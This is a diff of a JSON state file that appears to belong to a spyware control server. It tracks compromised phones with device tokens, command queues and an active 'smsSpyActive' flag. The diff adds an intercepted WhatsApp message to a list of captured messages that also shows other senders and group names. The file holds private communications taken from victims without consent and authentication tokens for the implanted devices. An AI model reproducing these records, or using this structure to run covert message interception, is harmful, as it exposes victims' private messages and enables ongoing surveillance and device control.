@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040477825,
+    "lastSeen": 1775040480746,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12108 pesan): ~ 🕷️",
+        "content": ".qc umm cyubul🥺🥺",
+        "time": "01/04 18:48",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040482303
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ISIAN ZAYN X OWN [6] (91 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
@@ -2497,7 +2505,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040478374,
+    "lastSeen": 1775040481460,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
